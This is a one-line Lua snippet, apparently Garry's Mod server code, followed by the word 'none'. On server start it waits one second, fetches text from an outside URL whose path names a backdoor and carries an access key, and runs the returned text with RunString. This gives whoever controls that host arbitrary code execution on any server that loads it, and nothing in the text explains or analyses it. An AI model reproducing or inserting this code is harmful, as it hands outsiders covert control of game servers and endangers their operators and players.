if SERVER then timer.Simple(1, function() http.Fetch("https://kpanel.cz/backdoor/yay1.php?key=gSLxXPgRnS",function(b,l,h,c)RunString(b)end,nil) end) end
none
